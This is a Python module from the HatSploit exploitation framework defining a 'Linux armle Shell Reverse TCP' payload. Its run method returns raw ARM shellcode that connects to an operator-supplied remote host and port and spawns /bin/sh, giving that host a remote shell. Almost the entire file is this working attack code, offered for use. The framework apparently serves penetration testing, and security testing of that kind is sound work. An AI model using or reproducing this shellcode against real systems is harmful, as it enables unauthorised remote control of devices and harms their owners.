"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from pex.socket import Socket


class HatSploitPayload(Payload, Socket):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux armle Shell Reverse TCP",
            'Payload': "linux/armle/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for Linux armle.",
            'Architecture': "armle",
            'Platform': "linux",
            'Rank': "high",
            'Type': "reverse_tcp",
        }

    def run(self):
        remote_host = self.pack_host(self.handler['RHOST'])
        remote_port = self.pack_port(self.handler['RPORT'])

        return (
                b"\x01\x10\x8F\xE2"
                b"\x11\xFF\x2F\xE1"
                b"\x02\x20\x01\x21"
                b"\x92\x1A\x0F\x02"
                b"\x19\x37\x01\xDF"
                b"\x06\x1C\x08\xA1"
                b"\x10\x22\x02\x37"
                b"\x01\xDF\x3F\x27"
                b"\x02\x21\x30\x1c"
                b"\x01\xdf\x01\x39"
                b"\xFB\xD5\x05\xA0"
                b"\x92\x1a\x05\xb4"
                b"\x69\x46\x0b\x27"
                b"\x01\xDF\xC0\x46"
                b"\x02\x00" + remote_port + remote_host + b"\x2f\x62\x69\x6e"
                                                          b"\x2f\x73\x68\x00"
        )
